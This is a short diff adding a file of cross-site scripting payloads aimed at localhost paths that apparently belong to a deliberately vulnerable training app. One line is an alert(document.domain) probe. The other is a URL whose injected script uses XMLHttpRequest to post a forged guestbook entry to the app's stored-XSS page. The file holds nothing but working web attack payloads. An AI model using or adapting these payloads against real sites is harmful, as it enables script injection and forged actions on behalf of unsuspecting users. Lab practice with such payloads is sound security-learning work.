@@ -1,0 +1,3 @@
+<script>alert(document.domain)</script>
+
+http://localhost/vulnerabilities/xss_r/?name=ad#<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://localhost/vulnerabilities/xss_s/',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');</script>
